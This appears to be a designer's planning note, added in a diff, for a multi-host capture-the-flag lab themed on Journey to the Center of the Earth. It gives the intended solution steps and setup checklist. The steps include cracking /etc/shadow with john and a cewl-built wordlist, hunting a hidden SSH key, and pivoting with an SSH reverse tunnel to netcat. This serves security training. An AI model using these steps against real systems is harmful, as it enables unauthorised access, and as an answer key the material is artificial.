@@ -1,0 +1,71 @@
+
+
+gotty > student@c2t2-000-bchd
+
+  STEPS:
+    0. find a throw away flag (first) 
+       grep COG *.txt
+    1. find the port 1863 in (ss or netstat for outbound ssh connections on the port)
+       - watch -n1 -d ss -antp
+       - tcpdump -i ens3 not port 2222 and ip
+    2. run john on the etc passwd to get the axel user's password
+       "There sure are a lot of WORDS in this book.  Make sure to not PASS your eyes over all of them"
+       - make a wordlist from heimskringla.txt
+         sudo apt install cewl john
+         python -m SimpleHTTPServer &
+         cewl localhost:8000/heimskringla.txt -w words
+         sudo john --wordlist=words /etc/shadow
+         # HINT: only do the hash you want (avoid 656000 rounds on the student user)
+    3. find the hostname crust 
+       nslookip <IP from ss -ant>
+    4. ssh to axel@c2t2-000-crust -p 1863
+
+axel@crust
+
+  STEPS:
+    1. find the PEM private key file burried on the crust server 
+       find / -type f  2>/dev/null | grep ".so$" | xargs -I {} -P0 file {} | egrep -v "ELF|ASCII|python|terminfo"
+       ssh-keygen -l -f <FILE> 
+    2. watch the syslog that is running on crust
+       a. cat flag into the log every 5 min (cron?) -> key is there and also failed attempts to connect to port
+    3. use that key to get to lindenbrock@mantle -> no bash just a key 
+
+lindenbrock@mantle
+
+  STEPS:
+    0. no shell here -- But GatewayPorts yes 
+    1. port forward 1337 reverse to netcat to recieve a flag and a clue for how to get to core (BONUS wireguard?)
+       ssh lindenbrock@c2t2-001-mantle -i /usr/lib/x86_64-linux-gnu/coreutils/libstdkey.so -NT -R 0.0.0.0:1337:localhost:1337 -v
+    3. Forward tunnel to core 
+
+stromboli@core
+
+  STEPS:
+    0. play game
+
+CONFIG Changes:
+
+  bchd:
+    - <x> Add axel user to bchd with a easily john'd password
+    - <x> FLAG: /bin/nope for axel's shell
+    - <x> CLUE_FILE: Norse book with axel@crust password and flag in int
+    - <x> outbound cron job sshing to crust
+
+  crust: 
+    - <~> ssh port 1862 on crust
+    - <x> Disable student ssh login with echo shell
+    - <x> FLAG FILE: pem is somewhere on this machine - flag in it
+    - <x> rsylog server
+
+  mantle: 
+    - <x> lindenbrock public key auth
+    - <x> rsyslog client
+    - < > sshd GatewayPorts yes
+
+  core: 
+    - < > netcat cron job to mantle port 1337
+
+BONUS:
+
+change MOTD on all servers
+fake logs into crust rsyslog
